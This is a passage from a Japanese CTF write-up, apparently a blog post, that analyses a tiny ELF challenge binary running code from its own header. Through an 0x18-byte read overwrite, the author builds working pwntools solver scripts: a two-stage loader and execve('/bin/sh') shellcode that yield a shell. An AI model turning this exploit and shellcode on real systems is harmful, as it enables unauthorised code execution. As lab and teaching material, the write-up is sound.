/static/6fcca7e48912a7c3e4ef3a5f3d7e413b/c83ae/image-20240225150808957.png 1180w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/6fcca7e48912a7c3e4ef3a5f3d7e413b/d9199/image-20240225150808957.png"
            alt="image-20240225150808957"
            title="image-20240225150808957"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>どうやら、ELF ヘッダ内のバイナリを実行コードとして解釈させることでこのような小さなバイナリを作成しているようです。</p>
<p>このような Tiny ELF を作成するテクニックは以下のような記事にまとめられているようです。</p>
<p>参考：<a href="https://nathanotterness.com/2021/10/tiny_elf_modernized.html" target="_blank" rel="nofollow noopener noreferrer">Tiny ELF Files: Revisited in 2021</a></p>
<p>参考：<a href="https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html" target="_blank" rel="nofollow noopener noreferrer">A Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux</a></p>
<p>今回のバイナリは Ghidra ではうまくディスアセンブルすることができませんでしたが、IDA を使用すると以下のようなコードを取得できました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 661px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/a57a02d2b40e45de00cb1e682e47e521/0012b/image-20240225142935715.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 74.16666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACDUlEQVQ4y41TCW7bMBD0/1/RF/QVLRIDiQO0CYq4TWJLtiUfokiJ1MFruqTkOAnstCssSJDc4WpmOOFpgs3dHbIfPyGr79jtvkLKX2iUQ9cZKNVDG4MQzjvwlseUvYyjaEVcD+G9x4QnS6xnswg6rscoCkXAGsVBQdRqLMDFCGARkC1ekE6nWN3cwBpNizZsgxUN6rrHnjPsyhLW+neF8Rvnb2NSvjwjubqiDmew2lD7w4HttobgLQ6HGk9/DmCsGX7buYs5dLjZIHl4wGY+hwmA40YlWjAhiUsDITT0uPdvQPqdlEA3eQ7rTiSW1NF8mWPPFNoG/x0THsCow/zxEc4ausURXxZ9byBVi6pu6XYfOQzrztnI83E8zoc9N6p8e4vt/T2UtGSRSD3a1qMsPWStYUxQuYsq972PabQnW3k0dE5rH2sG24w+3FKXAXC0HAF1pLInYb4hXX8B59O4PgAinus60MV4rQkXRpXT62tsyIve2ZMPyX+SbLPNJZaJQNMc9/zZPPkwG1ReB5VN4MJFHoVoIJSK3HSdjmMoDOOljBwGlZPVCusso+NvVVZ4WuzpKcroyd/kxSyvX819UWXGCqRJgozUDpwd+ShZj8WiQpoVyHcVnlc7ZKx8/1rOJAEypGmKjDoMqlk38KQ1Ivnn3uynPmyahhTkqKpqJHgA7Amc88EW+PBuPwP9C2yzjGcaDJgwAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/a57a02d2b40e45de00cb1e682e47e521/8ac56/image-20240225142935715.webp 240w,
/static/a57a02d2b40e45de00cb1e682e47e521/d3be9/image-20240225142935715.webp 480w,
/static/a57a02d2b40e45de00cb1e682e47e521/84ccf/image-20240225142935715.webp 661w"
              sizes="(max-width: 661px) 100vw, 661px"
              type="image/webp"
            />
          <source
            srcset="/static/a57a02d2b40e45de00cb1e682e47e521/8ff5a/image-20240225142935715.png 240w,
/static/a57a02d2b40e45de00cb1e682e47e521/e85cb/image-20240225142935715.png 480w,
/static/a57a02d2b40e45de00cb1e682e47e521/0012b/image-20240225142935715.png 661w"
            sizes="(max-width: 661px) 100vw, 661px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/a57a02d2b40e45de00cb1e682e47e521/0012b/image-20240225142935715.png"
            alt="image-20240225142935715"
            title="image-20240225142935715"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>上記の通り、エントリポイントとして指定されたアドレスから ELF ヘッダ内のコードを呼び出し、以下のようなコードを実行していることがわかります。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c">mov eax<span class="token punctuation">,</span> <span class="token number">3</span> <span class="token punctuation">;</span> システムコール番号<span class="token number">3</span> <span class="token punctuation">(</span>sys_read<span class="token punctuation">)</span>
mov ebx<span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">;</span> ファイルディスクリプタ<span class="token number">0</span> <span class="token punctuation">(</span>標準入力<span class="token punctuation">)</span>
pop ecx
xor cl<span class="token punctuation">,</span>cl
mov edx<span class="token punctuation">,</span><span class="token number">0x18</span>
<span class="token keyword">int</span> <span class="token number">0x80</span>
add al<span class="token punctuation">,</span> <span class="token punctuation">[</span>eax<span class="token punctuation">]</span>
add eax<span class="token punctuation">,</span><span class="token punctuation">[</span>eax<span class="token punctuation">]</span>
add <span class="token punctuation">[</span>eax<span class="token punctuation">]</span><span class="token punctuation">,</span>eax</code></pre></div>
<p>ここでは、<code class="language-text">ssize_t read(int fd, void buf[.count], size_t count);</code> であらわされる x86 の read システムコールが呼び出されます。</p>
<p>edx に 0x18 が格納されることから、入力が可能なサイズは 0x18 バイトに限定されます。</p>
<p>参考：<a href="https://man7.org/linux/man-pages/man2/read.2.html" target="_blank" rel="nofollow noopener noreferrer">read(2) - Linux manual page</a></p>
<p>ecx には通常入力されたバイト列を受け取るバッファのアドレスが指定されますが、<code class="language-text">pop ecx; xor cl,cl</code> というコードで取得できるアドレスが何を指すのかよくわかっていませんでした。</p>
<p>まず、<code class="language-text">pop ecx</code> が実行されたときのスタックトップに何の値が入っているのか考えます。</p>
<p>このコードはエントリポイントから call で呼び出されているので、スタックトップには現在 return 先のアドレス(0x08048028) が格納されていると想定されます。</p>
<p>さらに、<code class="language-text">xor cl,cl</code> で ecx のアドレスの下位の 1 バイト分のみを 0 に置き換えます。</p>
<p>これによって、<code class="language-text">pop ecx; xor cl,cl</code> は ecx レジスタにイメージベースを格納する処理であることがわかります。</p>
<p>つまり、read で受け取った一連の入力はイメージベース 0x8048000 から 0x18 バイト分の領域まで格納されると考えられます。</p>
<p>システムコールを発行した次の実行アドレスは 0x8048010 なので、read でプロセスメモリ内の実行コードをオーバーライドすることで、任意の命令を実行できそうだということがわかります。</p>
<p>しかし、この程度のサイズの命令ではシェルコードを発行できません。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 564px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/ae44752d73e82479a1ae62d3e1a1d53f/ba4d9/image-20240225144538133.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 24.583333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA8ElEQVQY04WPzW7CMBCE8/6v00NfgKJK0FJVLRI0oVKAQDBx7NiJE/Lz1YQLh6odabQj7e7sbCA3G3azGfH0CXU4kUnHfqdwrqUsm7E2tdeuZqDniq5vkVWOsAJTG3KvZSVRThGoOCb9/ODwtsApxT1kVlEUNZVtEcJ6o57/EIgwZDt/4XsyxZwznwLathubQhi0cmhr2J5SykvJdaD3xjd2d/rGYDmPeH58Z/KwII6OGL+sfNKyNKxXe6LwyDZJWK5iFq8bf+SMMQVa618Z2PSIjL7IwjWNtWOyYRjGqnJHoWtq13FIDElS0Fy6P1/+AfKefm73eM4wAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/ae44752d73e82479a1ae62d3e1a1d53f/8ac56/image-20240225144538133.webp 240w,
/static/ae44752d73e82479a1ae62d3e1a1d53f/d3be9/image-20240225144538133.webp 480w,
/static/ae44752d73e82479a1ae62d3e1a1d53f/0a341/image-20240225144538133.webp 564w"
              sizes="(max-width: 564px) 100vw, 564px"
              type="image/webp"
            />
          <source
            srcset="/static/ae44752d73e82479a1ae62d3e1a1d53f/8ff5a/image-20240225144538133.png 240w,
/static/ae44752d73e82479a1ae62d3e1a1d53f/e85cb/image-20240225144538133.png 480w,
/static/ae44752d73e82479a1ae62d3e1a1d53f/ba4d9/image-20240225144538133.png 564w"
            sizes="(max-width: 564px) 100vw, 564px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/ae44752d73e82479a1ae62d3e1a1d53f/ba4d9/image-20240225144538133.png"
            alt="image-20240225144538133"
            title="image-20240225144538133"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>この脆弱性を利用してどのようにシェルを取得するか考えます。</p>
<p>ここまでの想定が正しいか、gdb で動的解析を行いながら調べていきたいと思いますが、今回の問題バイナリは特殊な構造のためか、gdb で解析が上手く行えませんでした。</p>
<p>そこで、以下のアセンブリをビルドしたプログラムに対して解析を行います。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token punctuation">;</span> nasm <span class="token operator">-</span>f elf32 tmp<span class="token punctuation">.</span><span class="token keyword">asm</span> <span class="token operator">&amp;&amp;</span> ld <span class="token operator">-</span>m elf_i386 <span class="token operator">-</span>o tmp tmp<span class="token punctuation">.</span>o
section <span class="token punctuation">.</span>text
global _start

vlun<span class="token operator">:</span>
    mov eax<span class="token punctuation">,</span> <span class="token number">3</span>              <span class="token punctuation">;</span> システムコール番号<span class="token number">3</span> <span class="token punctuation">(</span>sys_read<span class="token punctuation">)</span>
    mov ebx<span class="token punctuation">,</span> <span class="token number">0</span>              <span class="token punctuation">;</span> ファイルディスクリプタ<span class="token number">0</span> <span class="token punctuation">(</span>標準入力<span class="token punctuation">)</span>
    pop ecx
    xor cl<span class="token punctuation">,</span>cl
    mov edx<span class="token punctuation">,</span><span class="token number">0x18</span>
    <span class="token keyword">int</span> <span class="token number">0x80</span>
    add al<span class="token punctuation">,</span> <span class="token punctuation">[</span>eax<span class="token punctuation">]</span>
    add eax<span class="token punctuation">,</span><span class="token punctuation">[</span>eax<span class="token punctuation">]</span>
    add <span class="token punctuation">[</span>eax<span class="token punctuation">]</span><span class="token punctuation">,</span>eax

_start<span class="token operator">:</span>
    call vlun
    xor al<span class="token punctuation">,</span> <span class="token number">0</span></code></pre></div>
<p>ただし、<code class="language-text">nasm -f elf32 tmp.asm &amp;&amp; ld -m elf_i386 -s -o tmp tmp.o</code> でビルドした状態では ELF ヘッダの領域に書き込みと実行権限がなく、問題バイナリと同じような挙動を再現できません。</p>
<p>そこで、ELF ヘッダのオフセット 0x1C から取得したプログラムヘッダの先頭に 32bit ELF のフラグが格納されるオフセット 0x18 を足した値の 0x4c のバイト値を読み取りフラグの 0x4 から 0x7 に置き換えます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 904px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/2973eec5555b388c40f38ea3a2602c4d/d9217/image-20240225152627792.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 65.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAABlUlEQVQ4y5WTSXKDMBBFfYxUmdkGxCDANnPKWaWyySFy/1P86LcRxs7GWXRJQurXvwd2SmUoigJt2+J0OolxTzufL3JX17XZnxFFETzPg+t6iONY3jRNgyAI5Lvv+9hleWGcSlwuFzE+suvQtej7Hmma4ng8iqOY7yLLMgm+DSRAlRUoS42u61YQH7XmfL5+yTc6uK6LMAwRhBGcuIQyQfI8lwC8I4xQo7BEVdUYhkGcqag1azfOaL5/5Hw4HMRRgNEBb/oKlcTQVSXBCLO2ywuNqm4wTaNAaYSM44Th49OsowD5+JZyCCdKRCFru1W4AmtT2HmexXlr79O4Am2NAqbm7KWGlVHIpimlNikTKAqnVSGNoMkE4f5R4a2jhLDehLKWmxoWaw3ZGGtM2357BjJFKuQ9z/v9XmACVFkOrSsMbIZxtjNooRa4prwAmSrvkiRZx2oZmwW4qNkCnxVaoE2ZUHaeQ27fvAzcKuQ+XbrsOI4o/pvyf4AGQD/+mjw/zOEd2L8E9AnwXASJhm5aM4/J/c7YL4m+hFBvkYBtAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/2973eec5555b388c40f38ea3a2602c4d/8ac56/image-20240225152627792.webp 240w,
/static/2973eec5555b388c40f38ea3a2602c4d/d3be9/image-20240225152627792.webp 480w,
/static/2973eec5555b388c40f38ea3a2602c4d/82aba/image-20240225152627792.webp 904w"
              sizes="(max-width: 904px) 100vw, 904px"
              type="image/webp"
            />
          <source
            srcset="/static/2973eec5555b388c40f38ea3a2602c4d/8ff5a/image-20240225152627792.png 240w,
/static/2973eec5555b388c40f38ea3a2602c4d/e85cb/image-20240225152627792.png 480w,
/static/2973eec5555b388c40f38ea3a2602c4d/d9217/image-20240225152627792.png 904w"
            sizes="(max-width: 904px) 100vw, 904px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/2973eec5555b388c40f38ea3a2602c4d/d9217/image-20240225152627792.png"
            alt="image-20240225152627792"
            title="image-20240225152627792"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>さらに、同じ要領で 2 番目のプログラムヘッダの値も書き換えます。</p>
<p>参考：<a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format" target="_blank" rel="nofollow noopener noreferrer">Executable and Linkable Format - Wikipedia</a></p>
<p>これによって、作成したプログラムでも ELF ヘッダの領域と .text セクションに書き込みと実行権限を割り当てることができました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 805px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/5ab780248328e9fa6af4d7f67a3c9a02/c946b/image-20240225152717195.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 37.083333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABdklEQVQoz4VRyVLCQBTMQQSRotCSRdEKYZEYyAYkEFbZAgFEdjcsy4v//wftmxEPnjx09Zutu988wb7UYCV1OGIJtaQBO6rDjpc4nCsLlagJK1ZCMZiHErgllqGGFOhhBfWYjkZchxW5g3OhwghmIazLY2zLE2zKHnb2DF/eHpuKh1G2Tmhgkm/BTTuoR1W0EgaqZwrMkwwMguZPEyTorA6kOQt9qYYhPeyJVbi5JpoJExVytM8LME9zqJGzFVH4nhPVUA7LKB6nCBJUYtX/w0yYJ2SCb60lRTd47F6qil11hq5o48mZY64NuNG+vcKIeKp0saZuNtYED2ofs0KX1wPJIWEJAkvgyR3uKgtJLvQ5fMaa2n5tLPDeWWNVGuOjt8NL4xFbe0oCU37OjJemiy2tmRFLK3SuK/yBJ7exMFye6P7GwjBThx7IoHAkcueCT0TRlzq0ewCt1UOt/rbsxDSsaDAsqUt/yabG/o4d/gcz9PceG8o37TjXCTR+a5AAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/5ab780248328e9fa6af4d7f67a3c9a02/8ac56/image-20240225152717195.webp 240w,
/static/5ab780248328e9fa6af4d7f67a3c9a02/d3be9/image-20240225152717195.webp 480w,
/static/5ab780248328e9fa6af4d7f67a3c9a02/82ef0/image-20240225152717195.webp 805w"
              sizes="(max-width: 805px) 100vw, 805px"
              type="image/webp"
            />
          <source
            srcset="/static/5ab780248328e9fa6af4d7f67a3c9a02/8ff5a/image-20240225152717195.png 240w,
/static/5ab780248328e9fa6af4d7f67a3c9a02/e85cb/image-20240225152717195.png 480w,
/static/5ab780248328e9fa6af4d7f67a3c9a02/c946b/image-20240225152717195.png 805w"
            sizes="(max-width: 805px) 100vw, 805px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/5ab780248328e9fa6af4d7f67a3c9a02/c946b/image-20240225152717195.png"
            alt="image-20240225152717195"
            title="image-20240225152717195"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>このプログラムを gdb で解析すると、想定通りシステムコール発行時の書き込みバッファアドレスがベースアドレスに指定されていることを確認できます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 833px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/9a1022d837403ce7cb185de9c0535dfa/5205c/image-20240225152235545.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 49.16666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB7UlEQVQoz3WS21PaQBTG89AZCeCIgNY6BZoSEgLZ3STCJlyCxQITLxVEW8d2ptMnO33p9P9/+Xp2RftQffjN2evZ831njV5D4sQaw8+74KYLtoGbbT3vFhi62yFYsQuuzhTaL9CByDswYucIayvGbNtGWvUxrUtM3oSIyx2MXwvMaE/uuBA5C0G+icB8ifc6GokrcRPM0SvaCOmCyNt0kSi0NFHR0fFpfYN4BrVOCWMsnDk8U0nykJS7iHY88C16kWD0Ks819VhQVHNm2nocbBG5B0SO9lWFwhIYlzhOD4cYNQY4F1OsWmOqqom4FuKYbFjYA4ysPjjZMigQSnrJgai0IVQsuwjKbYSkxIgOe5i5x8jcKSVMkNQkRiWGqMIhyEtZJLMrEmw/gNj1EdM8UQ2gMaty8F0GVmEQewHCogfjtJXi9/U9vqVrXAUL3A0ukTb6OCqRfKquV+1q+ezVOx05+aRki40N/yQ3HySfeR/w6/IHvsQXWIo5bpNPmJJEecDQrweYukOMD0IMqeN9ekR59VxjHteMzJ3gz+efuButsI4yikssqetze4QL/wT359/xNV3hliq/on2dSH2TxyTm5mdsvo8xedvX1WVOio9Wgows6O37CKsdyFqA2JOIqDmyTuz5/yUUT0lbmr/zzCbw+4M85wAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/9a1022d837403ce7cb185de9c0535dfa/8ac56/image-20240225152235545.webp 240w,
/static/9a1022d837403ce7cb185de9c0535dfa/d3be9/image-20240225152235545.webp 480w,
/static/9a1022d837403ce7cb185de9c0535dfa/184c4/image-20240225152235545.webp 833w"
              sizes="(max-width: 833px) 100vw, 833px"
              type="image/webp"
            />
          <source
            srcset="/static/9a1022d837403ce7cb185de9c0535dfa/8ff5a/image-20240225152235545.png 240w,
/static/9a1022d837403ce7cb185de9c0535dfa/e85cb/image-20240225152235545.png 480w,
/static/9a1022d837403ce7cb185de9c0535dfa/5205c/image-20240225152235545.png 833w"
            sizes="(max-width: 833px) 100vw, 833px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/9a1022d837403ce7cb185de9c0535dfa/5205c/image-20240225152235545.png"
            alt="image-20240225152235545"
            title="image-20240225152235545"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>これに、<code class="language-text">python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*0
x18)' > data</code> で作成したバイトデータを入力として与えてみます。</p>
<p>すると、以下のように入力値でコードの置き換えに成功したことを確認できます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 820px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/234e47122c5334b88746dca917d19fcb/9f82e/image-20240225153156591.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABQ0lEQVQoz4WRS0/CUBCFu+MdSsHKikihXFp6X1VCC1QhCCQQE4MLVyZs/f8/4DgXi0FcuPgyj3OTuWfGEp0YG7ZAcqPAiz5EmYGXBgQ75aIyQlTT4FUOeaqHf8n7RrcU01j4G6j2M3hNIWtL7IIn7MMFxjY9KnahSgaP6P2Lpfoah3iL2a2AKNxBUtOgKz5UuU9T+z/xnKur3qVmaUaWhxtIO0ZQCDCxQyRNTpZpYvEbYYbkuYlGExf6iYLRPFiCLDMnheockHTWWLIpXvUab+wRD+4IwmFIabJu0J6aQ8T1AWZUJxX6lUMroZ48a05Alt2YdphhF66w8jKk3SnGLYm0HkE0OD2McF+LKdJhnAjKjpBUQ4wJbpwQohGBtwRUU8CauxKfL0ccV+/Yj5b4yA7Y+nNM2uLKMh2F+G3Zy+nlmocvfN7JSyMwLlkAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/234e47122c5334b88746dca917d19fcb/8ac56/image-20240225153156591.webp 240w,
/static/234e47122c5334b88746dca917d19fcb/d3be9/image-20240225153156591.webp 480w,
/static/234e47122c5334b88746dca917d19fcb/b1f58/image-20240225153156591.webp 820w"
              sizes="(max-width: 820px) 100vw, 820px"
              type="image/webp"
            />
          <source
            srcset="/static/234e47122c5334b88746dca917d19fcb/8ff5a/image-20240225153156591.png 240w,
/static/234e47122c5334b88746dca917d19fcb/e85cb/image-20240225153156591.png 480w,
/static/234e47122c5334b88746dca917d19fcb/9f82e/image-20240225153156591.png 820w"
            sizes="(max-width: 820px) 100vw, 820px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/234e47122c5334b88746dca917d19fcb/9f82e/image-20240225153156591.png"
            alt="image-20240225153156591"
            title="image-20240225153156591"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>シェルを取得する糸口を見つけるため、システムコールを発行した状態でレジスタに何の値が格納されているかを考えることにします。</p>
<p>システムコールを発行した直後の時点では、ecx にベースアドレス、edx に 3 が格納されたままになっているはずです。</p>
<p> eax には read の戻り値である入力文字のサイズが格納されます。</p>
<p>ここから、例えば <code class="language-text">jmp ecx</code> を発行すると、オーバーライドした 0x18 バイト分の領域の先頭にジャンプして任意のコード実行につなげられそうだということがわかります。</p>
<p>実際にエクスプロイトが通るか確認するため、試しに以下のコードを実行してみます。</p>
<p>ここでは、<code class="language-text">b'\x90\x90\x90\x90\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xff\xe1'</code> という 18 バイト分のシェルコードをプログラムに送り込んでいます。</p>
<p>edx と ecx レジスタはバイトサイズの都合で変えていませんが、sys_write システムコールを使用して ecx に格納されたままになっているベースアドレスのデータを標準入力に出力するコードを記載しています。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># p = remote("0.cloud.chals.io", 20922)</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./download.elf"</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>
<span class="token triple-quoted-string string">"""
    nop
    nop
    nop
    nop
    mov eax, 4
    mov ebx, 1
    int 0x80
    jmp ecx
"""</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></div>
<p>このスクリプトを実行してみると、nop から始まるバイトデータが標準入力に返されることを確認できます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/f2fe1a6325f2ecb996f057d5c41fce36/1790f/image-20240225172502405.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 34.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/ElEQVQoz1VQ7VLCQAy8p1H8eAKkXFtxBgFHaCtCP67g+7/Dms3lqvzIJNnb7Cbn2pc92sUeu6cSH8+l5ALbxxw7qTcPObbWb2Ye67sM6/sl3iVY32Sr3aU8ovc1QvGF6+qEy+u3xnUVM99v68j5eTtLnDAKxiDG7AbfIEaNIW9UvF0c0C8riVpjFDPmLqvQyRsz+SGPc5Fb4Tz/pKABtiWHacCegwknpgI0FfFpAa0b5XTZAS4oWGmTNmKfRLU38cRRMTMglt6Y3WCuJOh2ZpBO5hD/Jtg2am6GxMn/W0oEO19NJ4/FcRId/v0Pzwk2GM+P39D7evpLPVm4v+NyCoNkl1n9AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/f2fe1a6325f2ecb996f057d5c41fce36/8ac56/image-20240225172502405.webp 240w,
/static/f2fe1a6325f2ecb996f057d5c41fce36/d3be9/image-20240225172502405.webp 480w,
/static/f2fe1a6325f2ecb996f057d5c41fce36/e46b2/image-20240225172502405.webp 960w,
/static/f2fe1a6325f2ecb996f057d5c41fce36/1671b/image-20240225172502405.webp 1189w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/f2fe1a6325f2ecb996f057d5c41fce36/8ff5a/image-20240225172502405.png 240w,
/static/f2fe1a6325f2ecb996f057d5c41fce36/e85cb/image-20240225172502405.png 480w,
/static/f2fe1a6325f2ecb996f057d5c41fce36/d9199/image-20240225172502405.png 960w,
/static/f2fe1a6325f2ecb996f057d5c41fce36/1790f/image-20240225172502405.png 1189w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/f2fe1a6325f2ecb996f057d5c41fce36/d9199/image-20240225172502405.png"
            alt="image-20240225172502405"
            title="image-20240225172502405"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>これで、<code class="language-text">jmp ecx</code> による任意のコード実行が可能なことを確認できました。</p>
<p>最後に、以下の Solver スクリプトでシェルを取得します。</p>
<p>ここでは、<code class="language-text">jmp ecx</code> の次の命令アドレスに再度 read で読み取ったデータを 0x7f バイト分書き込むことで、シェルを取得するためのシェルコード実行につなげています。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># p = remote("0.cloud.chals.io", 20922)</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./download.elf"</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>
<span class="token triple-quoted-string string">"""
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    mov al, 0x3
    add ecx,0x12
    mov dl, 0x7f
    int 0x80
    jmp ecx
"""</span><span class="token punctuation">)</span>

<span class="token comment"># print(shellcraft.sh())</span>
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>
<span class="token triple-quoted-string string">"""
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
"""</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></div>
<p>この Solver を実行することで Flag を取得できます。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 801px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/200ead58abbb7c9037b931df927eb867/2ad15/image-20240225172815610.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
